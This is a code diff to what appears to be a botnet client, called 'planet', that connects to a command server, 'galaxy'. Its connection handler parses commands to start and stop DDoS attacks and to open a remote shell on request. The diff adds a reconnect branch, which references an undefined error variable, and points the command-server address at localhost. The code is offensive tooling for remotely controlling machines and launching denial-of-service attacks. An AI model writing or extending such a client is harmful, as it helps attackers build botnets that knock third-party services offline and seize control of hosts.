@@ -180,7 +180,6 @@ def connection_handler():
         while planet_online:
             try:
                 data = planet_socket.recv(1024).decode("ascii").lower()
-                print(data)
                 if "ddos" in data:
                     data = data.replace("ddos ", "").strip().split()
                     if "stop" in data:
@@ -222,6 +221,11 @@ def connection_handler():
                 elif "shellcmd start bufsize " in data:
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                     shell(int(data.replace("shellcmd start bufsize ", "").strip()))
+                elif not data:
+                    print("Having trouble connecting to galaxy, attempting to reconnect...")
+                    print(f"Error: {e}")
+                    planet_online = False
+                    connect_to_galaxy()
             except IOError as e:
                 print("Having trouble connecting to galaxy, attempting to reconnect...")
                 print(f"Error: {e}")
@@ -246,7 +250,7 @@ signal(SIGINT, exit_handler)
 
 
 # variables
-galaxy_ip = "192.168.1.2"
+galaxy_ip = "127.0.0.1"
 galaxy_port = 9999
 shell_port = 10000
 planet_threads = multiprocessing.cpu_count()
